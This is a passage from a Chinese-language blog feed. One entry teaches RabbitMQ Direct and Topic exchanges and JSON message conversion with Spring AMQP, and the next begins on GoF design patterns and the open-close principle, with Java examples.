12.5.1.基于注解声明队列和交换机</h3><p>基于@Bean的方式声明队列和交换机比较麻烦，Spring还提供了基于注解方式来声明。</p><p>在consumer的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;direct.queue1&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span><br><span class="hljs-meta">    key = &#123;&quot;red&quot;, &quot;blue&quot;&#125;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenDirectQueue1</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者接收到direct.queue1的消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;direct.queue2&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span><br><span class="hljs-meta">    key = &#123;&quot;red&quot;, &quot;yellow&quot;&#125;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenDirectQueue2</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者接收到direct.queue2的消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1252消息发送"><a class="markdownIt-Anchor" href="#1252消息发送"></a> 12.5.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendDirectExchange</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 交换机名称</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">exchangeName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itcast.direct&quot;</span>;<br>    <span class="hljs-comment">// 消息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;红色警报！日本乱排核废水，导致海洋生物变异，惊现哥斯拉！&quot;</span>;<br>    <span class="hljs-comment">// 发送消息</span><br>    rabbitTemplate.convertAndSend(exchangeName, <span class="hljs-string">&quot;red&quot;</span>, message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1253总结"><a class="markdownIt-Anchor" href="#1253总结"></a> 12.5.3.总结</h3><p>描述下Direct交换机与Fanout交换机的差异？</p><ul><li>Fanout交换机将消息路由给每一个与之绑定的队列</li><li>Direct交换机根据RoutingKey判断路由给哪个队列</li><li>如果多个队列具有相同的RoutingKey，则与Fanout功能类似</li></ul><p>基于@RabbitListener注解声明队列和交换机有哪些常见注解？</p><ul><li>@Queue</li><li>@Exchange</li></ul><h2 id="126topic"><a class="markdownIt-Anchor" href="#126topic"></a> 12.6.Topic</h2><h3 id="1261说明"><a class="markdownIt-Anchor" href="#1261说明"></a> 12.6.1.说明</h3><p><code>Topic</code>类型的<code>Exchange</code>与<code>Direct</code>相比，都是可以根据<code>RoutingKey</code>把消息路由到不同的队列。只不过<code>Topic</code>类型<code>Exchange</code>可以让队列在绑定<code>Routing key</code> 的时候使用通配符！</p><p><code>Routingkey</code> 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： <code>item.insert</code></p><p>通配符规则：</p><p><code>#</code>：匹配一个或多个词</p><p><code>*</code>：匹配不多不少恰好1个词</p><p>举例：</p><p><code>item.#</code>：能够匹配<code>item.spu.insert</code> 或者 <code>item.spu</code></p><p><code>item.*</code>：只能匹配<code>item.spu</code></p><p>​</p><p>图示：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457959.png" alt="image-20210717170705380" /></p><p>解释：</p><ul><li>Queue1：绑定的是<code>china.#</code> ，因此凡是以 <code>china.</code>开头的<code>routing key</code> 都会被匹配到。包括china.news和china.weather</li><li>Queue2：绑定的是<code>#.news</code> ，因此凡是以 <code>.news</code>结尾的 <code>routing key</code> 都会被匹配。包括china.news和japan.news</li></ul><p>案例需求：</p><p>实现思路如下：</p><ol><li><p>并利用@RabbitListener声明Exchange、Queue、RoutingKey</p></li><li><p>在consumer服务中，编写两个消费者方法，分别监听topic.queue1和topic.queue2</p></li><li><p>在publisher中编写测试方法，向itcast. topic发送消息</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457960.png" alt="image-20210717170829229" /></p><h3 id="1262消息发送"><a class="markdownIt-Anchor" href="#1262消息发送"></a> 12.6.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * topicExchange</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendTopicExchange</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 交换机名称</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">exchangeName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itcast.topic&quot;</span>;<br>    <span class="hljs-comment">// 消息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;喜报！孙悟空大战哥斯拉，胜!&quot;</span>;<br>    <span class="hljs-comment">// 发送消息</span><br>    rabbitTemplate.convertAndSend(exchangeName, <span class="hljs-string">&quot;china.news&quot;</span>, message);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1263消息接收"><a class="markdownIt-Anchor" href="#1263消息接收"></a> 12.6.3.消息接收</h3><p>在consumer服务的SpringRabbitListener中添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;topic.queue1&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span><br><span class="hljs-meta">    key = &quot;china.#&quot;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenTopicQueue1</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者接收到topic.queue1的消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(bindings = @QueueBinding(</span><br><span class="hljs-meta">    value = @Queue(name = &quot;topic.queue2&quot;),</span><br><span class="hljs-meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span><br><span class="hljs-meta">    key = &quot;#.news&quot;</span><br><span class="hljs-meta">))</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenTopicQueue2</span><span class="hljs-params">(String msg)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;消费者接收到topic.queue2的消息：【&quot;</span> + msg + <span class="hljs-string">&quot;】&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>type = ExchangeTypes.TOPIC)</code> 指定交换机类型，默认为<code>direct</code></p><h3 id="1264总结"><a class="markdownIt-Anchor" href="#1264总结"></a> 12.6.4.总结</h3><p>描述下Direct交换机与Topic交换机的差异？</p><ul><li>Topic交换机接收的消息RoutingKey必须是多个单词，以 <code>**.**</code> 分割</li><li>Topic交换机与队列绑定时的bindingKey可以指定通配符</li><li><code>#</code>：代表0个或多个词</li><li><code>*</code>：代表1个词</li></ul><h2 id="127消息转换器"><a class="markdownIt-Anchor" href="#127消息转换器"></a> 12.7.消息转换器</h2><p>之前说过，Spring会把你发送的消息序列化为字节发送给MQ，接收消息的时候，还会把字节反序列化为Java对象。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457961.png" alt="image-20200525170410401" /></p><p>只不过，默认情况下Spring采用的序列化方式是JDK序列化。众所周知，JDK序列化存在下列问题：</p><ul><li>数据体积过大</li><li>有安全漏洞</li><li>可读性差</li></ul><p>我们来测试一下。</p><h3 id="1271测试默认转换器"><a class="markdownIt-Anchor" href="#1271测试默认转换器"></a> 12.7.1.测试默认转换器</h3><p>我们修改消息发送的代码，发送一个Map对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSendMap</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    <span class="hljs-comment">// 准备消息</span><br>    Map&lt;String,Object&gt; msg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    msg.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Jack&quot;</span>);<br>    msg.put(<span class="hljs-string">&quot;age&quot;</span>, <span class="hljs-number">21</span>);<br>    <span class="hljs-comment">// 发送消息</span><br>    rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;simple.queue&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, msg);<br>&#125;<br></code></pre></td></tr></table></figure><p>停止consumer服务</p><p>发送消息后查看控制台：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457962.png" alt="image-20210422232835363" /></p><h3 id="1272配置json转换器"><a class="markdownIt-Anchor" href="#1272配置json转换器"></a> 12.7.2.配置JSON转换器</h3><p>显然，JDK序列化方式并不合适。我们希望消息体的体积更小、可读性更高，因此可以使用JSON方式来做序列化和反序列化。</p><p>在publisher和consumer两个服务中都引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置消息转换器。</p><p>在启动类中添加一个Bean即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> MessageConverter <span class="hljs-title function_">jsonMessageConverter</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonMessageConverter</span>();<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>参考资料</p><ol><li><a href="https://blog.csdn.net/lyyrhf/article/details/120159288">RabbitMQ！女朋友看了都会的超详细保姆级附源码笔记！看完还不会请砍我！</a> (主要，博主人很好)</li><li><a href="https://pan.baidu.com/s/1HYQOom4lGmNsqBC9Ey5EJQ?pwd=yyds">尚硅谷RabbitMQ教程资料</a></li><li><a href="https://pan.baidu.com/s/19uMSxEE4zDIBAjPU-EUH_w?pwd=yyds">黑马SpringCloud的RabbitMQ部分资料 </a> （SpringAMQ部分）</li></ol></li><li><p>学习视频</p><ol><li><a href="https://www.bilibili.com/video/BV1cb4y1o7zz?p=1&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">尚硅谷RabbitMQ教程丨快速掌握MQ消息中间件</a></li><li><a href="https://www.bilibili.com/video/BV1LQ4y127n4?p=61&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">SpringCloud+RabbitMQ+Docker+Redis+搜索+分布式~~~</a> （SpringAMQ部分）</li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>MQ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MQ</tag>
      
      <tag>Rabbitmq</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>设计模式</title>
    <link href="/2023/01/05/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2023/01/05/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>标题高亮是常用的设计模式，在各大开源框架中用得都有很多。</p></blockquote><h1 id="设计模式"><a class="markdownIt-Anchor" href="#设计模式"></a> 设计模式</h1><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dp.png" alt="" /></p><p>设计模式（Designpattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p><table><thead><tr><th>创建型</th><th>创建型</th><th>结构型</th><th>结构型</th><th>行为型</th><th>行为型</th></tr></thead><tbody><tr><td>常用</td><td>不常用</td><td>常用</td><td>不常用</td><td>常用</td><td>不常用</td></tr><tr><td>单例（Singleton ）工厂（Factory）抽象工厂（Abstract Factory）建造者（Builder）</td><td>原型（Prototype ）</td><td>代理（Proxy ）桥接（Bridge）装饰者（Decorator ）适配器（Adapter）</td><td>外观（Facade ）组合（Composite ）享元（Flyweight）</td><td>观察者 （Observer ）模板（Template ）策略（Strategy ）职责链（Chain of Responsibility）迭代器（Iterator ）状态（State）</td><td>访问者（Visitor ）备忘录（Memento ）命令（Command ）解释器（Interpreter ）中介（Mediator ）</td></tr></tbody></table><h1 id="设计模式简介"><a class="markdownIt-Anchor" href="#设计模式简介"></a> 设计模式简介</h1><p>设计模式（Designpattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p><p>设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。<br />毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。</p><h2 id="什么是-gof四人帮全拼-gang-of-four"><a class="markdownIt-Anchor" href="#什么是-gof四人帮全拼-gang-of-four"></a> 什么是 GOF（四人帮，全拼 Gang of Four）？</h2><p>在 1994 年，由 Erich Gamma、Richard Helm、Ralph Johnson 和 John Vlissides 四人合著出版了一本名为<strong>Design Patterns - Elements of Reusable Object-Oriented Software（中文译名：设计模式 -可复用的面向对象软件元素）</strong> 的书，该书首次提到了软件开发中设计模式的概念。</p><p>四位作者合称 <strong>GOF（四人帮，全拼 Gang of Four）</strong> 。他们所提出的设计模式主要是基于以下的面向对象设计原则。</p><ul><li>对接口编程而不是对实现编程。</li><li>优先使用对象组合而不是继承。</li></ul><h2 id="设计模式的使用"><a class="markdownIt-Anchor" href="#设计模式的使用"></a> 设计模式的使用</h2><p>设计模式在软件开发中的两个主要用途。</p><h3 id="开发人员的共同平台"><a class="markdownIt-Anchor" href="#开发人员的共同平台"></a> 开发人员的共同平台</h3><p>设计模式提供了一个标准的术语系统，且具体到特定的情景。例如，单例设计模式意味着使用单个对象，这样所有熟悉单例设计模式的开发人员都能使用单个对象，并且可以通过这种方式告诉对方，程序使用的是单例模式。</p><h3 id="最佳的实践"><a class="markdownIt-Anchor" href="#最佳的实践"></a> 最佳的实践</h3><p>设计模式已经经历了很长一段时间的发展，它们提供了软件开发过程中面临的一般问题的最佳解决方案。学习这些模式有助于经验不足的开发人员通过一种简单快捷的方式来学习软件设计。</p><h2 id="设计模式的类型"><a class="markdownIt-Anchor" href="#设计模式的类型"></a> 设计模式的类型</h2><p>根据设计模式的参考书 <strong>Design Patterns - Elements of Reusable Object-Oriented<br />Software（中文译名：设计模式 - 可复用的面向对象软件元素）</strong> 中所提到的，总共有 23种设计模式。这些模式可以分为三大类：创建型模式（Creational Patterns）、结构型模式（StructuralPatterns）、行为型模式（Behavioral Patterns）。</p><p>1   <strong>创建型模式</strong></p><p>这些设计模式提供了一种在创建对象的同时隐藏创建逻辑的方式，而不是使用 new运算符直接实例化对象。这使得程序在判断针对某个给定实例需要创建哪些对象时更加灵活。</p><ul><li>工厂模式（Factory Pattern）</li><li>抽象工厂模式（Abstract Factory Pattern）</li><li>单例模式（Singleton Pattern）</li><li>建造者模式（Builder Pattern）</li><li>原型模式（Prototype Pattern）</li></ul><p>2 <strong>结构型模式</strong><br />这些设计模式关注类和对象的组合。继承的概念被用来组合接口和定义组合对象获得新功能的方式。</p><ul><li>适配器模式（Adapter Pattern）</li><li>桥接模式（Bridge Pattern）</li><li>过滤器模式（Filter、Criteria Pattern）</li><li>组合模式（Composite Pattern）</li><li>装饰器模式（Decorator Pattern）</li><li>外观模式（Facade Pattern）</li><li>享元模式（Flyweight Pattern）</li><li>代理模式（Proxy Pattern）</li></ul><p>3 <strong>行为型模式</strong><br />这些设计模式特别关注对象之间的通信。</p><ul><li>责任链模式（Chain of Responsibility Pattern）</li><li>命令模式（Command Pattern）</li><li>解释器模式（Interpreter Pattern）</li><li>迭代器模式（Iterator Pattern）</li><li>中介者模式（Mediator Pattern）</li><li>备忘录模式（Memento Pattern）</li><li>观察者模式（Observer Pattern）</li><li>状态模式（State Pattern）</li><li>空对象模式（Null Object Pattern）</li><li>策略模式（Strategy Pattern）</li><li>模板模式（Template Pattern）</li><li>访问者模式（Visitor Pattern）</li></ul><p>4  <strong>J2EE 模式</strong><br />这些设计模式特别关注表示层。这些模式是由 Sun Java Center 鉴定的。</p><ul><li>MVC 模式（MVC Pattern）</li><li>业务代表模式（Business Delegate Pattern）</li><li>组合实体模式（Composite Entity Pattern）</li><li>数据访问对象模式（Data Access Object Pattern）</li><li>前端控制器模式（Front Controller Pattern）</li><li>拦截过滤器模式（Intercepting Filter Pattern）</li><li>服务定位器模式（Service Locator Pattern）</li><li>传输对象模式（Transfer Object Pattern）</li></ul><p>下面用一个图片来整体描述一下设计模式之间的关系：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/the-relationship-between-design-patterns.jpg" alt="设计模式之间的关系" />(/</p><h1 id="设计模式的六大原则"><a class="markdownIt-Anchor" href="#设计模式的六大原则"></a> 设计模式的六大原则</h1><h2 id="1-开闭原则open-close-principle"><a class="markdownIt-Anchor" href="#1-开闭原则open-close-principle"></a> <strong>1、开闭原则（Open Close Principle）</strong></h2><p>开闭原则的意思是： <strong>对扩展开放，对修改关闭</strong>。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204034839.png" alt="image-20230108204034839" /></p><p><code>Ocp.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.ocp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ocp</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//使用看看存在的问题</span><br>      <span class="hljs-type">GraphicEditor</span> <span class="hljs-variable">graphicEditor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GraphicEditor</span>();<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>());<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//这是一个用于绘图的类 [使用方]</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphicEditor</span> &#123;<br>   <span class="hljs-comment">//接收Shape对象，然后根据type，来绘制不同的图形</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawShape</span><span class="hljs-params">(Shape s)</span> &#123;<br>      <span class="hljs-keyword">if</span> (s.m_type == <span class="hljs-number">1</span>)<br>         drawRectangle(s);<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s.m_type == <span class="hljs-number">2</span>)<br>         drawCircle(s);<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s.m_type == <span class="hljs-number">3</span>)<br>         drawTriangle(s);<br>   &#125;<br><br>   <span class="hljs-comment">//绘制矩形</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawRectangle</span><span class="hljs-params">(Shape r)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 绘制矩形 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">//绘制圆形</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawCircle</span><span class="hljs-params">(Shape r)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 绘制圆形 &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//绘制三角形</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawTriangle</span><span class="hljs-params">(Shape r)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 绘制三角形 &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//Shape类，基类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> &#123;<br>   <span class="hljs-type">int</span> m_type;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Rectangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">1</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Circle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">2</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//新增画三角形</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Triangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">3</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>方式 1 的优缺点</p></blockquote><ol><li><p>优点是比较好理解，简单易操作。</p></li><li><p>缺点是违反了设计模式的 ocp 原则，即对扩展开放(ᨀ 供方)，对修改关闭(使用方)。即当我们给类增加新功能的时候，尽量不修改代码，或者尽可能少修改代码.</p></li><li><p>比如我们这时要新增加一个图形种类 三角形，我们需要做如下修改，修改的地方较多</p></li></ol><blockquote><p>改进的思路分析</p></blockquote><p><strong>思路</strong>：把创建 <strong>Shape 类做成抽象类</strong>，并ᨀ 供一个<strong>抽象的 draw</strong> 方法，让<strong>子类去实现即可</strong>，这样我们有新的图形种类时，只需要让新的图形类继承 Shape，并实现 draw 方法即可，<strong>使用方的代码就不需要修</strong> -&gt; 满足了开闭原则</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108203845045.png" alt="image-20230108203845045" /></p><p><code>Ocp.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 